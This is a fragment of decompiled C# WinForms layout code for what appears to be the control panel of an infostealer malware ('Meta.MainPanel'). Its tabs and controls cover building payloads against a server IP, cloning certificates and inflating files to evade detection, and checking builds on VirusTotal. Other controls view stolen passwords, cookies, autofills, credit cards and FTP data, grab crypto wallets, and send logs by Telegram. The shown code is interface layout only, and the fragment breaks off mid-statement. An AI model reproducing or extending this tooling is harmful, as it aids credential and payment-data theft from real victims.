        this.singleIdSortTb = new GuiLib.AnimaTextBox();
        this.label9 = new System.Windows.Forms.Label();
        this.label8 = new System.Windows.Forms.Label();
        this.singleStatusLbl = new MetroSet_UI.Controls.MetroSetLabel();
        this.metroSetLabel1 = new MetroSet_UI.Controls.MetroSetLabel();
        this.builderTab = new System.Windows.Forms.TabPage();
        this.buildType = new System.Windows.Forms.ComboBox();
        this.label59 = new System.Windows.Forms.Label();
        this.errorMessageTb = new GuiLib.AnimaTextBox();
        this.label46 = new System.Windows.Forms.Label();
        this.c0 = new MetroSet_UI.Controls.MetroSetButton();
        this.buildIdTb = new GuiLib.AnimaTextBox();
        this.label20 = new System.Windows.Forms.Label();
        this.serverIpTb = new GuiLib.AnimaTextBox();
        this.label19 = new System.Windows.Forms.Label();
        this.createBuildBtn = new MetroSet_UI.Controls.MetroSetButton();
        this.openIconBtn = new MetroSet_UI.Controls.MetroSetButton();
        this.iconPath = new GuiLib.AnimaTextBox();
        this.label18 = new System.Windows.Forms.Label();
        this.refresherTab = new System.Windows.Forms.TabPage();
        this.label34 = new System.Windows.Forms.Label();
        this.freshCookiesTb = new GuiLib.AnimaTextBox();
        this.refreshCookiesBtn = new MetroSet_UI.Controls.MetroSetButton();
        this.accessTokenTb = new GuiLib.AnimaTextBox();
        this.refreshCookiesLbl = new System.Windows.Forms.Label();
        this.mergerTab = new System.Windows.Forms.TabPage();
        this.metroSetButton1 = new MetroSet_UI.Controls.MetroSetButton();
        this.mergeBtn = new MetroSet_UI.Controls.MetroSetButton();
        this.metroSetButton6 = new MetroSet_UI.Controls.MetroSetButton();
        this.fileToMergeLb = new System.Windows.Forms.ListBox();
        this.label25 = new System.Windows.Forms.Label();
        this.scannerTab = new System.Windows.Forms.TabPage();
        this.label33 = new System.Windows.Forms.Label();
        this.fileScanBtn = new MetroSet_UI.Controls.MetroSetButton();
        this.scanResults = new GuiLib.AnimaTextBox();
        this.miscTab = new System.Windows.Forms.TabPage();
        this.virusTotalTextbox = new GuiLib.AnimaTextBox();
        this.metroSetButton3 = new MetroSet_UI.Controls.MetroSetButton();
        this.virusTotalKey = new GuiLib.AnimaTextBox();
        this.label47 = new System.Windows.Forms.Label();
        this.openVirusTotalFile = new MetroSet_UI.Controls.MetroSetButton();
        this.virustotalFile = new GuiLib.AnimaTextBox();
        this.label48 = new System.Windows.Forms.Label();
        this.metroSetDivider19 = new MetroSet_UI.Controls.MetroSetDivider();
        this.pumpBtn = new MetroSet_UI.Controls.MetroSetButton();
        this.bytesCount = new GuiLib.AnimaTextBox();
        this.bytesCountLbl = new System.Windows.Forms.Label();
        this.openPumpBtn = new MetroSet_UI.Controls.MetroSetButton();
        this.pumpPath = new GuiLib.AnimaTextBox();
        this.pumpPathLbl = new System.Windows.Forms.Label();
        this.cloneBtn = new MetroSet_UI.Controls.MetroSetButton();
        this.certificate = new MetroSet_UI.Controls.MetroSetCheckBox();
        this.certificateLbl = new System.Windows.Forms.Label();
        this.assemblyInfo = new MetroSet_UI.Controls.MetroSetCheckBox();
        this.assemblyInfoLbl = new System.Windows.Forms.Label();
        this.metroSetDivider13 = new MetroSet_UI.Controls.MetroSetDivider();
        this.openBuildBtn = new MetroSet_UI.Controls.MetroSetButton();
        this.buildPathTb = new GuiLib.AnimaTextBox();
        this.buildPathLbl = new System.Windows.Forms.Label();
        this.openTargetBtn = new MetroSet_UI.Controls.MetroSetButton();
        this.targetPathTb = new GuiLib.AnimaTextBox();
        this.targetPathLbl = new System.Windows.Forms.Label();
        this.m_b2 = new System.Windows.Forms.TabPage();
        this.autoStartTelegramCb = new MetroSet_UI.Controls.MetroSetCheckBox();
        this.label57 = new System.Windows.Forms.Label();
        this.addIdBlackListBtn = new MetroSet_UI.Controls.MetroSetButton();
        this.removeIdBlackListBtn = new MetroSet_UI.Controls.MetroSetButton();
        this.blackListChatIds = new System.Windows.Forms.ListBox();
        this.label49 = new System.Windows.Forms.Label();
        this.addRecipientIdBtn = new MetroSet_UI.Controls.MetroSetButton();
        this.configRecipientIdBtn = new MetroSet_UI.Controls.MetroSetButton();
        this.removeRecipientIdBtn = new MetroSet_UI.Controls.MetroSetButton();
        this.recipientsIdsListBox = new System.Windows.Forms.ListBox();
        this.label51 = new System.Windows.Forms.Label();
        this.m_b3 = new MetroSet_UI.Controls.MetroSetButton();
        this.m_b4 = new MetroSet_UI.Controls.MetroSetLabel();
        this.m_b5 = new MetroSet_UI.Controls.MetroSetLabel();
        this.m_b6 = new GuiLib.AnimaTextBox();
        this.b7 = new System.Windows.Forms.Label();
        this.notificationTab = new System.Windows.Forms.TabPage();
        this.notificationTb = new System.Windows.Forms.RichTextBox();
        this.f7 = new System.Windows.Forms.TabPage();
        this.importBuilds = new MetroSet_UI.Controls.MetroSetButton();
        this.addBlackBuildBtn = new MetroSet_UI.Controls.MetroSetButton();
        this.blackBuildIdTb = new GuiLib.AnimaTextBox();
        this.label52 = new System.Windows.Forms.Label();
        this.blackListBuildsLb = new System.Windows.Forms.ListBox();
        this.label53 = new System.Windows.Forms.Label();
        this.importCountries = new MetroSet_UI.Controls.MetroSetButton();
        this.f8 = new MetroSet_UI.Controls.MetroSetDivider();
        this.f9 = new MetroSet_UI.Controls.MetroSetButton();
        this.fa = new MetroSet_UI.Controls.MetroSetButton();
        this.fb = new MetroSet_UI.Controls.MetroSetButton();
        this.fc = new GuiLib.AnimaTextBox();
        this.fd = new System.Windows.Forms.Label();
        this.fe = new System.Windows.Forms.ListBox();
        this.ff = new System.Windows.Forms.Label();
        this.importIPs = new MetroSet_UI.Controls.MetroSetButton();
        this.addBlackIPBtn = new MetroSet_UI.Controls.MetroSetButton();
        this.blackIPTb = new GuiLib.AnimaTextBox();
        this.label23 = new System.Windows.Forms.Label();
        this.blackListIPsLb = new System.Windows.Forms.ListBox();
        this.label24 = new System.Windows.Forms.Label();
        this.addBlackCountryBtn = new MetroSet_UI.Controls.MetroSetButton();
        this.blackCountryTb = new GuiLib.AnimaTextBox();
        this.blackCountryLbl = new System.Windows.Forms.Label();
        this.blackListLb = new System.Windows.Forms.ListBox();
        this.blackListLbl = new System.Windows.Forms.Label();
        this.logHeaderTab = new System.Windows.Forms.TabPage();
        this.label2 = new System.Windows.Forms.Label();
        this.saveLogHeaderBtn = new MetroSet_UI.Controls.MetroSetButton();
        this.logsHeaderTb = new GuiLib.AnimaTextBox();
        this.settingsTab = new System.Windows.Forms.TabPage();
        this.label61 = new System.Windows.Forms.Label();
        this.autoUpdatePanelCb = new MetroSet_UI.Controls.MetroSetCheckBox();
        this.refresherLbl = new System.Windows.Forms.Label();
        this.autoRefreshCb = new MetroSet_UI.Controls.MetroSetCheckBox();
        this.resetDefaultSettingBtn = new MetroSet_UI.Controls.MetroSetButton();
        this.addNewBrowserExtBtn = new MetroSet_UI.Controls.MetroSetButton();
        this.newBrowserExtTb = new GuiLib.AnimaTextBox();
        this.label29 = new System.Windows.Forms.Label();
        this.browsersExtensionsListBox = new System.Windows.Forms.ListBox();
        this.label30 = new System.Windows.Forms.Label();
        this.privateCreatorKeyTb = new GuiLib.AnimaTextBox();
        this.showCreatorKeyBtn = new MetroSet_UI.Controls.MetroSetButton();
        this.label7 = new System.Windows.Forms.Label();
        this.metroSetButton4 = new MetroSet_UI.Controls.MetroSetButton();
        this.label45 = new System.Windows.Forms.Label();
        this.discordCb = new MetroSet_UI.Controls.MetroSetCheckBox();
        this.e5 = new MetroSet_UI.Controls.MetroSetButton();
        this.e6 = new GuiLib.AnimaTextBox();
        this.e7 = new System.Windows.Forms.Label();
        this.ce = new System.Windows.Forms.Label();
        this.cf = new MetroSet_UI.Controls.MetroSetCheckBox();
        this.d0 = new System.Windows.Forms.Label();
        this.d1 = new MetroSet_UI.Controls.MetroSetCheckBox();
        this.c9 = new System.Windows.Forms.Label();
        this.ca = new MetroSet_UI.Controls.MetroSetCheckBox();
        this.cb = new System.Windows.Forms.Label();
        this.cc = new MetroSet_UI.Controls.MetroSetCheckBox();
        this.m_a5 = new System.Windows.Forms.Label();
        this.m_a6 = new MetroSet_UI.Controls.MetroSetCheckBox();
        this.domainDetectorImportBtn = new MetroSet_UI.Controls.MetroSetButton();
        this.addDomainPatternBtn = new MetroSet_UI.Controls.MetroSetButton();
        this.domainDetectorTb = new GuiLib.AnimaTextBox();
        this.label5 = new System.Windows.Forms.Label();
        this.cd = new System.Windows.Forms.ListBox();
        this.label6 = new System.Windows.Forms.Label();
        this.pathsImportBtn = new MetroSet_UI.Controls.MetroSetButton();
        this.userAgentLbl = new System.Windows.Forms.Label();
        this.blockEmptyLogsCb = new MetroSet_UI.Controls.MetroSetCheckBox();
        this.grabColdWalletLbl = new System.Windows.Forms.Label();
        this.grabColdWalletCb = new MetroSet_UI.Controls.MetroSetCheckBox();
        this.duplicateLbl = new System.Windows.Forms.Label();
        this.duplicateCb = new MetroSet_UI.Controls.MetroSetCheckBox();
        this.metroSetDivider10 = new MetroSet_UI.Controls.MetroSetDivider();
        this.saveSettingsBtn = new MetroSet_UI.Controls.MetroSetButton();
        this.addSearchPatternBtn = new MetroSet_UI.Controls.MetroSetButton();
        this.searchPatternTb = new GuiLib.AnimaTextBox();
        this.searchPatternLbl = new System.Windows.Forms.Label();
        this.getFilesSettingsLb = new System.Windows.Forms.ListBox();
        this.getFilesSettingsLbl = new System.Windows.Forms.Label();
        this.grabFilesLbl = new System.Windows.Forms.Label();
        this.grabFilesCb = new MetroSet_UI.Controls.MetroSetCheckBox();
        this.grabImClientsLbl = new System.Windows.Forms.Label();
        this.grabImClientsCb = new MetroSet_UI.Controls.MetroSetCheckBox();
        this.grabFtpsLbl = new System.Windows.Forms.Label();
        this.grabFtpsCb = new MetroSet_UI.Controls.MetroSetCheckBox();
        this.grabBrowsersLbl = new System.Windows.Forms.Label();
        this.grabBrowsersCb = new MetroSet_UI.Controls.MetroSetCheckBox();
        this.partnersTab = new System.Windows.Forms.TabPage();
        this.partnerPoster6 = new Meta.MainPanel.Data.UI.PartnerPoster();
        this.partnerPoster5 = new Meta.MainPanel.Data.UI.PartnerPoster();
        this.partnerPoster4 = new Meta.MainPanel.Data.UI.PartnerPoster();
        this.partnerPoster3 = new Meta.MainPanel.Data.UI.PartnerPoster();
        this.partnerPoster2 = new Meta.MainPanel.Data.UI.PartnerPoster();
        this.partnerPoster1 = new Meta.MainPanel.Data.UI.PartnerPoster();
        this.object_15 = new System.Windows.Forms.BindingSource((System.ComponentModel.IContainer)this.object_11);
        this.object_12 = new System.Windows.Forms.BindingSource((System.ComponentModel.IContainer)this.object_11);
        this.object_14 = new System.Windows.Forms.BindingSource((System.ComponentModel.IContainer)this.object_11);
        ((System.Windows.Forms.Control)this.logContextMenu).SuspendLayout();
        ((System.Windows.Forms.Control)this.m_a3).SuspendLayout();
        ((System.Windows.Forms.Control)this.blackListCms_1).SuspendLayout();
        ((System.Windows.Forms.Control)this.blackListCms_2).SuspendLayout();
        ((System.Windows.Forms.Control)this.blackListCms_3).SuspendLayout();
        ((System.Windows.Forms.Control)this.topHeader).SuspendLayout();
        ((System.Windows.Forms.Control)this.c1).SuspendLayout();
        ((System.Windows.Forms.Control)this.bc).SuspendLayout();
        ((System.Windows.Forms.Control)this.c4).SuspendLayout();
        ((System.Windows.Forms.Control)this.blackListCms_6).SuspendLayout();
        ((System.Windows.Forms.Control)this.blackListCms_7).SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.object_13).BeginInit();
        ((System.Windows.Forms.Control)this.blackListCms_8).SuspendLayout();
        ((System.Windows.Forms.Control)this.dashboardTabs).SuspendLayout();
        ((System.Windows.Forms.Control)this.logsTab).SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.logsListView).BeginInit();
        ((System.ComponentModel.ISupportInitialize)this.object_16).BeginInit();
        ((System.Windows.Forms.Control)this.statisticTab).SuspendLayout();
        ((System.Windows.Forms.Control)this.guestLinkTab).SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.guestFilesDgv).BeginInit();
        ((System.ComponentModel.ISupportInitialize)this.object_18).BeginInit();
        ((System.ComponentModel.ISupportInitialize)this.guestLinksDgv).BeginInit();
        ((System.ComponentModel.ISupportInitialize)this.object_19).BeginInit();
        ((System.Windows.Forms.Control)this.sorterTab).SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.cookiesMoreThan).BeginInit();
        ((System.ComponentModel.ISupportInitialize)this.passMoreThan).BeginInit();
        ((System.Windows.Forms.Control)this.builderTab).SuspendLayout();
        ((System.Windows.Forms.Control)this.refresherTab).SuspendLayout();
        ((System.Windows.Forms.Control)this.mergerTab).SuspendLayout();
        ((System.Windows.Forms.Control)this.scannerTab).SuspendLayout();
        ((System.Windows.Forms.Control)this.miscTab).SuspendLayout();
        ((System.Windows.Forms.Control)this.m_b2).SuspendLayout();
        ((System.Windows.Forms.Control)this.notificationTab).SuspendLayout();
        ((System.Windows.Forms.Control)this.f7).SuspendLayout();
        ((System.Windows.Forms.Control)this.logHeaderTab).SuspendLayout();
        ((System.Windows.Forms.Control)this.settingsTab).SuspendLayout();
        ((System.Windows.Forms.Control)this.partnersTab).SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.object_15).BeginInit();
        ((System.ComponentModel.ISupportInitialize)this.object_12).BeginInit();
        ((System.ComponentModel.ISupportInitialize)this.object_14).BeginInit();
        base.SuspendLayout();
        ((System.Windows.Forms.Control)this.panel1).Dock = System.Windows.Forms.DockStyle.Bottom;
        ((System.Windows.Forms.Control)this.panel1).Location = new System.Drawing.Point(0, 52);
        ((System.Windows.Forms.Control)this.panel1).Name = "panel1";
        ((System.Windows.Forms.Control)this.panel1).Size = new System.Drawing.Size(1366, 622);
        ((System.Windows.Forms.Control)this.panel1).TabIndex = 0;
        ((System.Windows.Forms.ToolStrip)this.logContextMenu).Items.AddRange(new System.Windows.Forms.ToolStripItem[9]
        {
            (System.Windows.Forms.ToolStripItem)this.systemInfoToolStripMenuItem,
            (System.Windows.Forms.ToolStripItem)this.viewersToolStripMenuItem,
            (System.Windows.Forms.ToolStripItem)this.saveToolStripMenuItem,
            (System.Windows.Forms.ToolStripItem)this.runtimeExceptionToolStripMenuItem,
            (System.Windows.Forms.ToolStripItem)this.d2,
            (System.Windows.Forms.ToolStripItem)this.blockHwidtoolStripMenuItem8,
            (System.Windows.Forms.ToolStripItem)this.ec,
            (System.Windows.Forms.ToolStripItem)this.c8,
            (System.Windows.Forms.ToolStripItem)this.deleteToolStripMenuItem1
        });
        ((System.Windows.Forms.Control)this.logContextMenu).Name = "logContextMenu";
        ((System.Windows.Forms.Control)this.logContextMenu).Size = new System.Drawing.Size(191, 202);
        ((System.Windows.Forms.ToolStripDropDown)this.logContextMenu).Opening += new System.ComponentModel.CancelEventHandler(logContextMenu_Opening);
        ((System.Windows.Forms.ToolStripItem)this.systemInfoToolStripMenuItem).Name = "systemInfoToolStripMenuItem";
        ((System.Windows.Forms.ToolStripItem)this.systemInfoToolStripMenuItem).Size = new System.Drawing.Size(190, 22);
        ((System.Windows.Forms.ToolStripItem)this.systemInfoToolStripMenuItem).Text = "System Info";
        ((System.Windows.Forms.ToolStripItem)this.systemInfoToolStripMenuItem).Click += new System.EventHandler(systemInfoToolStripMenuItem_Click);
        ((System.Windows.Forms.ToolStripDropDownItem)this.viewersToolStripMenuItem).DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[6]
        {
            (System.Windows.Forms.ToolStripItem)this.passwordsToolStripMenuItem,
            (System.Windows.Forms.ToolStripItem)this.cookiesToolStripMenuItem,
            (System.Windows.Forms.ToolStripItem)this.autofillsToolStripMenuItem,
            (System.Windows.Forms.ToolStripItem)this.creditCardsToolStripMenuItem,
            (System.Windows.Forms.ToolStripItem)this.fTPToolStripMenuItem,
            (System.Windows.Forms.ToolStripItem)this.filesToolStripMenuItem
        });
        ((System.Windows.Forms.ToolStripItem)this.viewersToolStripMenuItem).Name = "viewersToolStripMenuItem";
        ((System.Windows.Forms.ToolStripItem)this.viewersToolStripMenuItem).Size = new System.Drawing.Size(190, 22);
        ((System.Windows.Forms.ToolStripItem)this.viewersToolStripMenuItem).Text = "Viewers";
        ((System.Windows.Forms.ToolStripItem)this.passwordsToolStripMenuItem).Name = "passwordsToolStripMenuItem";
        ((System.Windows.Forms.ToolStripItem)this.passwordsToolStripMenuItem).Size = new System.Drawing.Size(139, 22);
        ((System.Windows.Forms.ToolStripItem)this.passwordsToolStripMenuItem).Text = "Passwords";
        ((System.Windows.Forms.ToolStripItem)this.passwordsToolStripMenuItem).Click += new System.EventHandler(passwordsToolStripMenuItem_Click);
        ((System.Windows.Forms.ToolStripItem)this.cookiesToolStripMenuItem).Name = "cookiesToolStripMenuItem";
        ((System.Windows.Forms.ToolStripItem)this.cookiesToolStripMenuItem).Size = new System.Drawing.Size(139, 22);
        ((System.Windows.Forms.ToolStripItem)this.cookiesToolStripMenuItem).Text = "Cookies";
        ((System.Windows.Forms.ToolStripItem)this.cookiesToolStripMenuItem).Click += new System.EventHandler(cookiesToolStripMenuItem_Click);
        ((System.Windows.Forms.ToolStripItem)this.autofillsToolStripMenuItem).Name = "autofillsToolStripMenuItem";
        ((System.Windows.Forms.ToolStripItem)this.autofillsToolStripMenuItem).Size = new System.Drawing.Size(139, 22);
        ((System.Windows.Forms.ToolStripItem)this.autofillsToolStripMenuItem).Text = "Autofills";
        ((System.Windows.Forms.ToolStripItem)this.autofillsToolStripMenuItem).Click += new System.EventHandler(autofillsToolStripMenuItem_Click);
        ((System.Windows.Forms.ToolStripItem)this.creditCardsToolStripMenuItem).Name = "creditCardsToolStripMenuItem";
        ((System.Windows.Forms.ToolStripItem)this.creditCardsToolStripMenuItem).Size = new System.Drawing.Size(139, 22);
        ((System.Windows.Forms.ToolStripItem)this.creditCardsToolStripMenuItem).Text = "Credit Cards";
        ((System.Windows.Forms.ToolStripItem)this.creditCardsToolStripMenuItem).Click += new System.EventHandler(creditCardsToolStripMenuItem_Click);
        ((System.Windows.Forms.ToolStripItem)this.fTPToolStripMenuItem).Name = "fTPToolStripMenuItem";
        ((System.Windows.Forms.ToolStripItem)this.fTPToolStripMenuItem).Size = new System.Drawing.Size(139, 22);
        ((System.Windows.Forms.ToolStripItem)this.fTPToolStripMenuItem).Text = "FTP";
        ((System.Windows.Forms.ToolStripItem)this.fTPToolStripMenuItem).Click += new System.EventHandler(fTPToolStripMenuItem_Click);
        ((System.Windows.Forms.ToolStripItem)this.filesToolStripMenuItem).Name = "filesToolStripMenuItem";
        ((System.Windows.Forms.ToolStripItem)this.filesToolStripMenuItem).Size = new System.Drawing.Size(139, 22);
        ((System.Windows.Forms.ToolStripItem)this.filesToolStripMenuItem).Text = "Files";
        ((System.Windows.Forms.ToolStripItem)this.filesToolStripMenuItem).Click += new System.EventHandler(filesToolStripMenuItem_Click);
        ((System.Windows.Forms.ToolStripItem)this.saveToolStripMenuItem).Name = "saveToolStripMenuItem";
        ((System.Windows.Forms.ToolStripItem)this.saveToolStripMenuItem).Size = new System.Drawing.Size(190, 22);
        ((System.Windows.Forms.ToolStripItem)this.saveToolStripMenuItem).Text = "Save";
        ((System.Windows.Forms.ToolStripItem)this.saveToolStripMenuItem).Click += new System.EventHandler(saveToolStripMenuItem_Click);
        ((System.Windows.Forms.ToolStripItem)this.runtimeExceptionToolStripMenuItem).Name = "runtimeExceptionToolStripMenuItem";
        ((System.Windows.Forms.ToolStripItem)this.runtimeExceptionToolStripMenuItem).Size = new System.Drawing.Size(190, 22);
        ((System.Windows.Forms.ToolStripItem)this.runtimeExceptionToolStripMenuItem).Text = "Runtime Exceptions";
        ((System.Windows.Forms.ToolStripItem)this.runtimeExceptionToolStripMenuItem).Click += new System.EventHandler(runtimeExceptionToolStripMenuItem_Click);
        ((System.Windows.Forms.ToolStripItem)this.d2).Name = "blockIptoolStripMenuItem";
        ((System.Windows.Forms.ToolStripItem)this.d2).Size = new System.Drawing.Size(190, 22);
        ((System.Windows.Forms.ToolStripItem)this.d2).Text = "Block IP";
        ((System.Windows.Forms.ToolStripItem)this.d2).Click += new System.EventHandler(d2_Click);
        ((System.Windows.Forms.ToolStripItem)this.blockHwidtoolStripMenuItem8).Name = "blockHwidtoolStripMenuItem8";
        ((System.Windows.Forms.ToolStripItem)this.blockHwidtoolStripMenuItem8).Size = new System.Drawing.Size(190, 22);
        ((System.Windows.Forms.ToolStripItem)this.blockHwidtoolStripMenuItem8).Text = "Block HWID";
        ((System.Windows.Forms.ToolStripItem)this.blockHwidtoolStripMenuItem8).Click += new System.EventHandler(blockHwidtoolStripMenuItem8_Click);
        ((System.Windows.Forms.ToolStripItem)this.ec).Name = "showDomainDetects";
        ((System.Windows.Forms.ToolStripItem)this.ec).Size = new System.Drawing.Size(190, 22);
        ((System.Windows.Forms.ToolStripItem)this.ec).Text = "Show Domain Detects";
        ((System.Windows.Forms.ToolStripItem)this.ec).Click += new System.EventHandler(ec_Click);
        ((System.Windows.Forms.ToolStripItem)this.c8).Name = "toolStripMenuItem6";
        ((System.Windows.Forms.ToolStripItem)this.c8).Size = new System.Drawing.Size(190, 22);
        ((System.Windows.Forms.ToolStripItem)this.deleteToolStripMenuItem1).Name = "deleteToolStripMenuItem1";
        ((System.Windows.Forms.ToolStripItem)this.deleteToolStripMenuItem1).Size = new System.Drawing.Size(190, 22);
        ((System.Windows.Forms.ToolStripItem)this.deleteToolStripMenuItem1).Text = "Delete";
        ((System.Windows.Forms.ToolStripItem)this.deleteToolStripMenuItem1).Click += new System.EventHandler(deleteToolStripMenuItem1_Click);
        ((System.Windows.Forms.ToolStrip)this.m_a3).Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { (System.Windows.Forms.ToolStripItem)this.m_a4 });
        ((System.Windows.Forms.Control)this.m_a3).Name = "blackListCms";
        ((System.Windows.Forms.Control)this.m_a3).Size = new System.Drawing.Size(108, 26);
        ((System.Windows.Forms.ToolStripDropDown)this.m_a3).Opening += new System.ComponentModel.CancelEventHandler(a3_Opening);
        ((System.Windows.Forms.ToolStripItem)this.m_a4).Name = "toolStripMenuItem3";
        ((System.Windows.Forms.ToolStripItem)this.m_a4).Size = new System.Drawing.Size(107, 22);
        ((System.Windows.Forms.ToolStripItem)this.m_a4).Text = "Delete";
        ((System.Windows.Forms.ToolStripItem)this.m_a4).Click += new System.EventHandler(a4_Click);
        ((System.Windows.Forms.ToolStrip)this.blackListCms_1).Items.AddRange(new System.Windows.Forms.ToolStripItem[2]
        {
            (System.Windows.Forms.ToolStripItem)this.d4,
            (System.Windows.Forms.ToolStripItem)this.toolStripMenuItem2
        });
        ((System.Windows.Forms.Control)this.blackListCms_1).Name = "blackListCms";
        ((System.Windows.Forms.Control)this.blackListCms_1).Size = new System.Drawing.Size(108, 48);
        ((System.Windows.Forms.ToolStripDropDown)this.blackListCms_1).Opening += new System.ComponentModel.CancelEventHandler(blackListCms_1_Opening);
        ((System.Windows.Forms.ToolStripItem)this.d4).Name = "toolStripMenuItem7";
        ((System.Windows.Forms.ToolStripItem)this.d4).Size = new System.Drawing.Size(107, 22);
        ((System.Windows.Forms.ToolStripItem)this.d4).Text = "Edit";
        ((System.Windows.Forms.ToolStripItem)this.d4).Click += new System.EventHandler(d4_Click);
        ((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem2).Name = "toolStripMenuItem2";
        ((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem2).Size = new System.Drawing.Size(107, 22);
        ((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem2).Text = "Delete";
        ((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem2).Click += new System.EventHandler(toolStripMenuItem2_Click);
        ((System.Windows.Forms.ToolStrip)this.blackListCms_2).Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { (System.Windows.Forms.ToolStripItem)this.deleteToolStripMenuItem });
        ((System.Windows.Forms.Control)this.blackListCms_2).Name = "blackListCms";
        ((System.Windows.Forms.Control)this.blackListCms_2).Size = new System.Drawing.Size(108, 26);
        ((System.Windows.Forms.ToolStripDropDown)this.blackListCms_2).Opening += new System.ComponentModel.CancelEventHandler(blackListCms_2_Opening);
        ((System.Windows.Forms.ToolStripItem)this.deleteToolStripMenuItem).Name = "deleteToolStripMenuItem";
        ((System.Windows.Forms.ToolStripItem)this.deleteToolStripMenuItem).Size = new System.Drawing.Size(107, 22);
        ((System.Windows.Forms.ToolStripItem)this.deleteToolStripMenuItem).Text = "Delete";
        ((System.Windows.Forms.ToolStripItem)this.deleteToolStripMenuItem).Click += new System.EventHandler(deleteToolStripMenuItem_Click);
        ((System.Windows.Forms.ToolStrip)this.blackListCms_3).Items.AddRange(new System.Windows.Forms.ToolStripItem[2]
        {
            (System.Windows.Forms.ToolStripItem)this.d3,
            (System.Windows.Forms.ToolStripItem)this.toolStripMenuItem1
        });
        ((System.Windows.Forms.Control)this.blackListCms_3).Name = "blackListCms";
        ((System.Windows.Forms.Control)this.blackListCms_3).Size = new System.Drawing.Size(108, 48);
        ((System.Windows.Forms.ToolStripDropDown)this.blackListCms_3).Opening += new System.ComponentModel.CancelEventHandler(blackListCms_3_Opening);
        ((System.Windows.Forms.ToolStripItem)this.d3).Name = "editToolStripMenuItem";
        ((System.Windows.Forms.ToolStripItem)this.d3).Size = new System.Drawing.Size(107, 22);
        ((System.Windows.Forms.ToolStripItem)this.d3).Text = "Edit";
        ((System.Windows.Forms.ToolStripItem)this.d3).Click += new System.EventHandler(d3_Click);
        ((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem1).Name = "toolStripMenuItem1";
        ((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem1).Size = new System.Drawing.Size(107, 22);
        ((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem1).Text = "Delete";
        ((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem1).Click += new System.EventHandler(toolStripMenuItem1_Click);
        ((System.Windows.Forms.Control)this.topHeader).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.Control)this.topHeader).Controls.Add((System.Windows.Forms.Control)this.reloadBtn);
        ((System.Windows.Forms.Control)this.topHeader).Controls.Add((System.Windows.Forms.Control)this.c7);
        ((System.Windows.Forms.Control)this.topHeader).Controls.Add((System.Windows.Forms.Control)this.minimizeBtn);
        ((System.Windows.Forms.Control)this.topHeader).Controls.Add((System.Windows.Forms.Control)this.mainTitle);
        ((System.Windows.Forms.Control)this.topHeader).Controls.Add((System.Windows.Forms.Control)this.closeBtn);
        ((System.Windows.Forms.Control)this.topHeader).Dock = System.Windows.Forms.DockStyle.Top;
        ((System.Windows.Forms.Control)this.topHeader).ForeColor = System.Drawing.Color.Silver;
        ((System.Windows.Forms.Control)this.topHeader).Location = new System.Drawing.Point(0, 0);
        ((System.Windows.Forms.Control)this.topHeader).Name = "topHeader";
        ((System.Windows.Forms.Control)this.topHeader).Size = new System.Drawing.Size(1366, 30);
        ((System.Windows.Forms.Control)this.topHeader).TabIndex = 1;
        ((System.Windows.Forms.Control)this.topHeader).Paint += new System.Windows.Forms.PaintEventHandler(topHeader_Paint);
        ((MetroSet_UI.Controls.MetroSetButton)this.reloadBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.reloadBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.reloadBtn).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.reloadBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.reloadBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.reloadBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.reloadBtn).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.reloadBtn).Location = new System.Drawing.Point(1214, 3);
        ((System.Windows.Forms.Control)this.reloadBtn).Name = "reloadBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.reloadBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.reloadBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.reloadBtn).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.reloadBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.reloadBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.reloadBtn).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.reloadBtn).Size = new System.Drawing.Size(52, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.reloadBtn).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.reloadBtn).StyleManager = null;
        ((System.Windows.Forms.Control)this.reloadBtn).TabIndex = 38;
        ((System.Windows.Forms.Control)this.reloadBtn).Text = "Reload";
        ((MetroSet_UI.Controls.MetroSetButton)this.reloadBtn).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.reloadBtn).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.reloadBtn).Click += new System.EventHandler(reloadBtn_Click);
        ((MetroSet_UI.Controls.MetroSetButton)this.c7).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
